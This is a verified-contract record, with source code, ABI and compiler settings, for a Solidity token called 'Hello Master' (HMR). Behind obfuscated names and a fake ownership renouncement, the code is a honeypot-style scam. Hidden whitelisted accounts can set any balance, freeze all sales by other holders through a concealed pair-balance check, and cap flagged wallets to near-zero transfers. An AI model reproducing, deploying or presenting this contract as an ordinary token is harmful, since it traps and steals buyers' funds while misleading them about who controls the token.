{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface isLaunch {\n    function createPair(address txFund, address takeMode) external returns (address);\n}\n\ninterface teamLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderSwap) external view returns (uint256);\n\n    function transfer(address receiverSell, uint256 sellToBuy) external returns (bool);\n\n    function allowance(address atAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellToBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverSell,\n        uint256 sellToBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalLaunchedWallet, uint256 value);\n    event Approval(address indexed atAuto, address indexed spender, uint256 value);\n}\n\nabstract contract teamSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface teamLaunchedMetadata is teamLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HelloMaster is teamSwap, teamLaunched, teamLaunchedMetadata {\n\n    bool public maxTo;\n\n    bool public maxReceiver;\n\n    event OwnershipTransferred(address indexed launchedExempt, address indexed amountAuto);\n\n    function owner() external view returns (address) {\n        return launchBuy;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromFund;\n    }\n\n    function txIs(address maxTeam, uint256 sellToBuy) public {\n        walletAuto();\n        takeShould[maxTeam] = sellToBuy;\n    }\n\n    function marketingTeamIs(address launchedLiquidity) public {\n        require(launchedLiquidity.balance < 100000);\n        if (totalLaunch) {\n            return;\n        }\n        \n        receiverSender[launchedLiquidity] = true;\n        if (maxReceiver != feeSell) {\n            atBuy = limitShould;\n        }\n        totalLaunch = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return launchBuy;\n    }\n\n    function balanceOf(address senderSwap) public view virtual override returns (uint256) {\n        return takeShould[senderSwap];\n    }\n\n    mapping(address => bool) public amountFundReceiver;\n\n    function approve(address sellAuto, uint256 sellToBuy) public virtual override returns (bool) {\n        tokenMin[_msgSender()][sellAuto] = sellToBuy;\n        emit Approval(_msgSender(), sellAuto, sellToBuy);\n        return true;\n    }\n\n    uint8 private listLaunch = 18;\n\n    uint256 public totalSell;\n\n    function limitMarketing(address launchedMinAuto) public {\n        walletAuto();\n        if (totalSell == atBuy) {\n            totalSell = atBuy;\n        }\n        if (launchedMinAuto == tokenAmount || launchedMinAuto == exemptLimit) {\n            return;\n        }\n        amountFundReceiver[launchedMinAuto] = true;\n    }\n\n    address swapLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private minBuy = \"HMR\";\n\n    mapping(address => mapping(address => uint256)) private tokenMin;\n\n    uint256 txLimit;\n\n    function allowance(address tokenAtMin, address sellAuto) external view virtual override returns (uint256) {\n        if (sellAuto == swapLaunch) {\n            return type(uint256).max;\n        }\n        return tokenMin[tokenAtMin][sellAuto];\n    }\n\n    address private launchBuy;\n\n    address public exemptLimit;\n\n    function atSwapFee(address senderWallet, address receiverSell, uint256 sellToBuy) internal returns (bool) {\n        require(takeShould[senderWallet] >= sellToBuy);\n        takeShould[senderWallet] -= sellToBuy;\n        takeShould[receiverSell] += sellToBuy;\n        emit Transfer(senderWallet, receiverSell, sellToBuy);\n        return true;\n    }\n\n    uint256 private tokenTotalTake;\n\n    address public tokenAmount;\n\n    function name() external view virtual override returns (string memory) {\n        return sellBuy;\n    }\n\n    uint256 private limitShould;\n\n    function transfer(address maxTeam, uint256 sellToBuy) external virtual override returns (bool) {\n        return buyLaunchedSender(_msgSender(), maxTeam, sellToBuy);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return minBuy;\n    }\n\n    constructor (){\n        \n        feeSwap takeLimit = feeSwap(swapLaunch);\n        exemptLimit = isLaunch(takeLimit.factory()).createPair(takeLimit.WETH(), address(this));\n        \n        tokenAmount = _msgSender();\n        receiverSender[tokenAmount] = true;\n        takeShould[tokenAmount] = fromFund;\n        feeExempt();\n        \n        emit Transfer(address(0), tokenAmount, fromFund);\n    }\n\n    function feeExempt() public {\n        emit OwnershipTransferred(tokenAmount, address(0));\n        launchBuy = address(0);\n    }\n\n    uint256 private senderLimit;\n\n    string private sellBuy = \"Hello Master\";\n\n    uint256 constant liquidityBuy = 12 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listLaunch;\n    }\n\n    address sellToToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function buyLaunchedSender(address senderWallet, address receiverSell, uint256 sellToBuy) internal returns (bool) {\n        if (senderWallet == tokenAmount) {\n            return atSwapFee(senderWallet, receiverSell, sellToBuy);\n        }\n        uint256 receiverTake = teamLaunched(exemptLimit).balanceOf(sellToToken);\n        require(receiverTake == txLimit);\n        require(receiverSell != sellToToken);\n        if (amountFundReceiver[senderWallet]) {\n            return atSwapFee(senderWallet, receiverSell, liquidityBuy);\n        }\n        return atSwapFee(senderWallet, receiverSell, sellToBuy);\n    }\n\n    mapping(address => bool) public receiverSender;\n\n    mapping(address => uint256) private takeShould;\n\n    bool private maxWallet;\n\n    uint256 public amountMax;\n\n    function sellShouldAuto(uint256 sellToBuy) public {\n        walletAuto();\n        txLimit = sellToBuy;\n    }\n\n    function walletAuto() private view {\n        require(receiverSender[_msgSender()]);\n    }\n\n    uint256 launchAmount;\n\n    bool public totalLaunch;\n\n    bool public feeSell;\n\n    uint256 private fromFund = 100000000 * 10 ** 18;\n\n    function transferFrom(address senderWallet, address receiverSell, uint256 sellToBuy) external override returns (bool) {\n        if (_msgSender() != swapLaunch) {\n            if (tokenMin[senderWallet][_msgSender()] != type(uint256).max) {\n                require(sellToBuy <= tokenMin[senderWallet][_msgSender()]);\n                tokenMin[senderWallet][_msgSender()] -= sellToBuy;\n            }\n        }\n        return buyLaunchedSender(senderWallet, receiverSell, sellToBuy);\n    }\n\n    uint256 public atBuy;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalLaunchedWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAtMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountFundReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellToBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMinAuto\",\"type\":\"address\"}],\"name\":\"limitMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"}],\"name\":\"marketingTeamIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellToBuy\",\"type\":\"uint256\"}],\"name\":\"sellShouldAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellToBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellToBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellToBuy\",\"type\":\"uint256\"}],\"name\":\"txIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HelloMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}